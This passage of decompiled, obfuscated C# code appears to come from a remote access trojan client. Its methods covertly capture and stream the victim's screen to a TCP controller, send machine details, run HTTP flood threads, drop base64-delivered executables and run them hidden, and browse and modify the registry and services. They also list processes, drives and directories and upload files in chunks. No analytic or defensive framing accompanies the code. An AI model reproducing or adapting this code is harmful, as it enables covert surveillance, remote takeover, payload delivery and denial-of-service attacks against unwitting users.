			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 1)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 2)), wNlYuvH169, Hb89l6T170);
			list15.Add(item);
			List<Rectangle> list16 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 2)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 2)), wNlYuvH169, Hb89l6T170);
			list16.Add(item);
		}
	}

	private void y8LcO4jxpr3uNEF4G152(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			while (bool_0)
			{
				try
				{
					string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
					string text = null;
					EncoderParameters val = new EncoderParameters(1);
					val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
					ImageCodecInfo val2 = SEjDuRfgKU106("image/jpeg");
					Bitmap val3 = new Bitmap(AgdpdbADNmzn53.Width, AgdpdbADNmzn53.Height, (PixelFormat)135173);
					checked
					{
						wNlYuvH169 = (int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0);
						Hb89l6T170 = (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0);
						Bitmap val4 = new Bitmap(wNlYuvH169, Hb89l6T170, (PixelFormat)135173);
						Size size = new Size(wNlYuvH169, Hb89l6T170);
						Graphics val5 = Graphics.FromImage((Image)(object)val3);
						val5.CopyFromScreen(AgdpdbADNmzn53.X, AgdpdbADNmzn53.Y, 0, 0, AgdpdbADNmzn53.Size, (CopyPixelOperation)13369376);
						int num = 0;
						do
						{
							try
							{
								Bitmap val6 = val3.Clone(list_0[num], (PixelFormat)135173);
								val5 = Graphics.FromImage((Image)(object)val4);
								val5.set_InterpolationMode((InterpolationMode)7);
								val5.set_CompositingQuality((CompositingQuality)2);
								val5.DrawImage((Image)(object)val6, 0, 0, wNlYuvH169, Hb89l6T170);
								MemoryStream memoryStream = new MemoryStream();
								if (Conversions.ToDouble(array[0]) > 75.0)
								{
									((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								}
								else
								{
									((Image)val4).Save((Stream)memoryStream, val2, val);
								}
								memoryStream.Capacity = (int)memoryStream.Length;
								try
								{
									if (num < 10)
									{
										CgFWa5k173 = "0" + Conversions.ToString(num);
									}
									else
									{
										CgFWa5k173 = Conversions.ToString(num);
									}
									if (memoryStream.Length != n2nT2it172[num])
									{
										byte[] buffer = memoryStream.GetBuffer();
										text = Convert.ToBase64String(buffer);
										buffer = null;
										try
										{
											isdSfdsAR70.WriteLine("/STARTSE0/" + CgFWa5k173 + text);
											isdSfdsAR70.Flush();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											return;
										}
										VkyGYMA174++;
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								n2nT2it172[num] = (int)memoryStream.Length;
								memoryStream.Dispose();
								memoryStream.Close();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 15);
						((Image)val4).Dispose();
						((Image)val3).Dispose();
						val5.Dispose();
						GC.Collect();
						text = null;
						try
						{
							isdSfdsAR70.WriteLine("/STARTSET/");
							isdSfdsAR70.Flush();
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void NTrtxGtcNKDweajk3153(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			try
			{
				while (bool_0)
				{
					try
					{
						string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
						string text = null;
						EncoderParameters val = new EncoderParameters(1);
						val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
						ImageCodecInfo val2 = SEjDuRfgKU106("image/jpeg");
						Bitmap val3 = new Bitmap(AgdpdbADNmzn53.Width, AgdpdbADNmzn53.Height, (PixelFormat)135173);
						wNlYuvH169 = AgdpdbADNmzn53.Width;
						Hb89l6T170 = AgdpdbADNmzn53.Height;
						new Bitmap(wNlYuvH169, Hb89l6T170, (PixelFormat)135173);
						Size size = new Size(wNlYuvH169, Hb89l6T170);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						val4.CopyFromScreen(AgdpdbADNmzn53.X, AgdpdbADNmzn53.Y, 0, 0, AgdpdbADNmzn53.Size, (CopyPixelOperation)13369376);
						MemoryStream memoryStream = new MemoryStream();
						if (Conversions.ToDouble(array[0]) > 75.0)
						{
							((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						else
						{
							((Image)val3).Save((Stream)memoryStream, val2, val);
						}
						checked
						{
							memoryStream.Capacity = (int)memoryStream.Length;
							if (memoryStream.Length == wgNWP93175)
							{
								try
								{
									isdSfdsAR70.WriteLine("/STARTSEQ/SAME");
									isdSfdsAR70.Flush();
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
									break;
								}
							}
							else
							{
								byte[] buffer = memoryStream.GetBuffer();
								text = Convert.ToBase64String(buffer);
								buffer = null;
								try
								{
									isdSfdsAR70.WriteLine("/STARTSEQ/" + text);
									isdSfdsAR70.Flush();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									break;
								}
							}
							wgNWP93175 = (int)memoryStream.Length;
							memoryStream.Dispose();
							memoryStream.Close();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					GC.Collect();
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(100);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void s5RE4GN75Nt7rVVPC154(object Tempdata)
	{
		int num = 0;
		do
		{
			try
			{
				if (!y3AOPy8176)
				{
					break;
				}
				Type typeFromHandle = typeof(WebRequest);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Create", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)obj;
				byte[] bytes = Encoding.UTF8.GetBytes("Hello");
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.Method = "POST";
				httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest2.ContentLength = bytes.Length;
				httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
				httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
				httpWebRequest2 = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				Stream stream = requestStream;
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				stream = null;
				requestStream = null;
				HttpWebResponse httpWebResponse = null;
				try
				{
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
				catch (WebException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
				httpWebResponse = null;
				responseStream = null;
				streamReader = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		while (num <= 100);
	}

	private void method_9(object Tempdata)
	{
		y3AOPy8176 = true;
		int num = 0;
		while (y3AOPy8176)
		{
			Thread thread = new Thread(s5RE4GN75Nt7rVVPC154);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
			num = checked(num + 1);
			if (num > 100)
			{
				break;
			}
		}
	}

	private void cAc2IdDmsS04lOHHB156()
	{
		try
		{
			UrXmHDk158 = new TcpClient();
			UrXmHDk158.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
			LxMHgzt159 = UrXmHDk158.GetStream();
			MUXIz59160 = new StreamWriter(LxMHgzt159);
			QgC2uUC6fwwZxChSLm3NbGFF49 qgC2uUC6fwwZxChSLm3NbGFF = new QgC2uUC6fwwZxChSLm3NbGFF49();
			string text = qgC2uUC6fwwZxChSLm3NbGFF.fI3fH3qKlEX225();
			string text2 = qgC2uUC6fwwZxChSLm3NbGFF.yqV9lLbcbAn237();
			string text3 = qgC2uUC6fwwZxChSLm3NbGFF.TA3z4yflcPg226();
			string text4 = qgC2uUC6fwwZxChSLm3NbGFF.TvkcSXGwksP229();
			string text5 = qgC2uUC6fwwZxChSLm3NbGFF.IRGZ0d8RndE233();
			string text6 = qgC2uUC6fwwZxChSLm3NbGFF.w1gYi5WqFBU234();
			string text7 = qgC2uUC6fwwZxChSLm3NbGFF.YjcNWytwvwm230();
			string text8 = qgC2uUC6fwwZxChSLm3NbGFF.r5gQveqgmU7235();
			string text9 = qgC2uUC6fwwZxChSLm3NbGFF.ulmURKSwZxj236();
			string text10 = qgC2uUC6fwwZxChSLm3NbGFF.NqAJ9HTr7QK238();
			string text11 = qgC2uUC6fwwZxChSLm3NbGFF.erdirBwlKX0BnmhF6NVjNlFA217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			MUXIz59160.WriteLine("/TRYPAAAA/" + ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Name() + "¦" + v6pJR2A5qz112(Conversions.ToString(obj), "&%#@?,:*"));
			MUXIz59160.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			if (Conversions.ToDouble(array[1]) == 1.0)
			{
				Process.Start(array[0]);
				return;
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[0]);
			byte[] bytes = Encoding.UTF8.GetBytes("Hello");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest2.ContentLength = bytes.Length;
			httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
			httpWebRequest2 = null;
			Stream requestStream = httpWebRequest.GetRequestStream();
			Stream stream = requestStream;
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			stream = null;
			requestStream = null;
			HttpWebResponse httpWebResponse = null;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest = null;
			httpWebResponse = null;
			responseStream = null;
			streamReader = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void JlCAncx6yzhWGvXjy158()
	{
		y3AOPy8176 = false;
	}

	private void bR18KXCnFRwfxlg6C159(object temp)
	{
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
			NetworkStream stream = tcpClient.GetStream();
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/TRYAVVVV/", temp), (object)"¦"), (object)YUUzZXOziU104()));
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_11(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			string text2 = array.GetValue(0)!.ToString();
			if (Operators.CompareString(text2, "temp", false) == 0)
			{
				text2 = Path.GetTempPath();
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(text2 + text))
			{
				byte[] array2 = Convert.FromBase64String(Conversions.ToString(array.GetValue(2)));
				((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().WriteAllBytes(text2 + text, array2, false);
				uqpHzbxjkt122(5);
			}
			string text3 = Conversions.ToString(array.GetValue(3));
			if (Operators.CompareString(text3, "0", false) == 0)
			{
				Process process = new Process();
				process.StartInfo.WorkingDirectory = text2;
				process.StartInfo.FileName = text2 + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			else
			{
				Process process2 = new Process();
				process2.StartInfo.WorkingDirectory = text2;
				process2.StartInfo.FileName = text2 + text;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process2.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void mRVAZo0cIl1Q0e0P3161()
	{
		try
		{
			QyB2pDIjA5KZpJpmNSiL135.WriteLine("/LISTPROC/" + qqSDQOR3N9117());
			QyB2pDIjA5KZpJpmNSiL135.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void pBexucqDQTiFi0162()
	{
		try
		{
			u6uEY40dzTkhV1bR7ZGM140.WriteLine("/LISTSERV/" + tDGG7fgk47118());
			u6uEY40dzTkhV1bR7ZGM140.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void mrbYpa26Y3OYky163(object swfm)
	{
		try
		{
			string text = null;
			text = J4inBDVzcV121();
			NewLateBinding.LateCall(swfm, (Type)null, "WriteLine", new object[1] { "/LISTDRVS/" + text }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swfm, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ESPiSjryyNSFvX164(object Tempdata)
	{
		try
		{
			string text = null;
			string text2 = null;
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(Tempdata));
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Tempdata, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
			{
				text2 = "(DIR).*(DIR)..*";
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text = "(DIR)" + directoryInfo2.get_Name();
				text2 = text2 + text + "*";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text = fileInfo.get_Name();
				text2 = text2 + text + "*";
			}
			UCIidqfxf80.WriteLine("/ONLYONEP/" + text2);
			UCIidqfxf80.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			UCIidqfxf80.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
			UCIidqfxf80.Flush();
			ProjectData.ClearProjectError();
		}
	}

	private void method_12(object Node)
	{
		string text = null;
		string[] array = null;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Node, (object)"CU", false))
			{
				array = Registry.CurrentUser.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"LM", false))
			{
				array = Registry.LocalMachine.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"US", false))
			{
				array = Registry.Users.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			EimR8Vj3xjq0KynhQlAT150.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/REGYVIEW/", Node), (object)text));
			EimR8Vj3xjq0KynhQlAT150.Flush();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DaJvRRYY30MZyO166(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				EimR8Vj3xjq0KynhQlAT150.WriteLine("/REGVIEWS/" + text);
				EimR8Vj3xjq0KynhQlAT150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Tn6KF5XtmhyYTf167(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '¦' });
			registryKey.SetValue(array2[0], array2[1]);
			OrWSYJUuiyHqTv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_13(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			registryKey.DeleteValue(array[1], throwOnMissingValue: false);
			OrWSYJUuiyHqTv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void rHKqMRvr8QYVla169(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '╫' });
			string[] array3 = array2[0].Split(new char[1] { '¦' });
			string[] array4 = array2[1].Split(new char[1] { '¦' });
			registryKey.DeleteValue(array4[0], throwOnMissingValue: false);
			registryKey.SetValue(array3[0], array3[1]);
			OrWSYJUuiyHqTv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OrWSYJUuiyHqTv170(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj));
			}
			if (array.Length <= 0)
			{
				return;
			}
			string[] array2 = array;
			foreach (object obj3 in array2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj3)));
				if (objectValue == null)
				{
					continue;
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text2 = null;
				try
				{
					if ((object)objectValue2.GetType() == typeof(byte[]))
					{
						text2 = Convert.ToBase64String((byte[])objectValue2) + "bytearraystring";
					}
					else
					{
						Encoding uTF = Encoding.UTF8;
						object[] array3 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
						bool[] array4 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet((object)uTF, (Type)null, "GetBytes", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						text2 = Convert.ToBase64String((byte[])obj4);
					}
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "¥"), obj3), (object)"§"), (object)text2)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj3, (object)"§"), (object)text2)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				EimR8Vj3xjq0KynhQlAT150.WriteLine("/REGVIEWV/" + text);
				EimR8Vj3xjq0KynhQlAT150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void jJW26N2Ex8c2JC171(object Tempdata)
	{
		try
		{
			Thread thread = new Thread(method_16);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void qRfmLKyDqUFffW172(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			switch (array[1])
			{
			case "STOP":
			{
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak5 = new DViQSZoLzIUbQjlcdrIp8hak48(array[0]);
				((ServiceController)dViQSZoLzIUbQjlcdrIp8hak5).Stop();
				break;
			}
			case "START":
			{
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak4 = new DViQSZoLzIUbQjlcdrIp8hak48(array[0]);
				((ServiceController)dViQSZoLzIUbQjlcdrIp8hak4).Start();
				break;
			}
			case "DISABLE":
			{
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak3 = new DViQSZoLzIUbQjlcdrIp8hak48(array[0]);
				dViQSZoLzIUbQjlcdrIp8hak3.StartupType = "Disabled";
				break;
			}
			case "MANUAL":
			{
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak2 = new DViQSZoLzIUbQjlcdrIp8hak48(array[0]);
				dViQSZoLzIUbQjlcdrIp8hak2.StartupType = "Manual";
				break;
			}
			case "AUTO":
			{
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak = new DViQSZoLzIUbQjlcdrIp8hak48(array[0]);
				dViQSZoLzIUbQjlcdrIp8hak.StartupType = "Auto";
				break;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void pbJlXZ8pTWOy8a173()
	{
		checked
		{
			try
			{
				if (XprZQm9f6UOa37 != ivD3hCg9IW0f43)
				{
					StringBuilder stringBuilder = new StringBuilder();
					StringBuilder stringBuilder2 = new StringBuilder();
					XprZQm9f6UOa37++;
					H3plzYvXsMtH38 = new byte[BOLtpl2xntEB35 - 1 + 1];
					binaryReader_0.Read(H3plzYvXsMtH38, 0, BOLtpl2xntEB35);
					Zdg7kHRo81V645 = binaryReader_0.BaseStream.Seek(0L, SeekOrigin.Current);
					stringBuilder.Append("/PAKSSEND/");
					int num = H3plzYvXsMtH38.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder2.Append(H3plzYvXsMtH38.GetValue(i)!.ToString() + " ");
					}
					stringBuilder.Append((object?)stringBuilder2);
					UCIidqfxf80.WriteLine((object?)stringBuilder);
					UCIidqfxf80.Flush();
				}
				else if (g5Tyml3av6ZZ44 > 0L)
				{
					StringBuilder stringBuilder3 = new StringBuilder();
					StringBuilder stringBuilder4 = new StringBuilder();
					H3plzYvXsMtH38 = new byte[(int)(g5Tyml3av6ZZ44 - 1L) + 1];
					binaryReader_0.Read(H3plzYvXsMtH38, 0, (int)g5Tyml3av6ZZ44);
					stringBuilder3.Append("/FINEDOWN/");
					int num2 = H3plzYvXsMtH38.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder4.Append(H3plzYvXsMtH38.GetValue(j)!.ToString() + " ");
					}
					stringBuilder3.Append((object?)stringBuilder4);
					UCIidqfxf80.WriteLine((object?)stringBuilder3);
					UCIidqfxf80.Flush();
					YGfmWIyWpK114();
				}
				else
				{
					UCIidqfxf80.WriteLine("/FINEDOWN/");
					UCIidqfxf80.Flush();
					YGfmWIyWpK114();
				}
			}
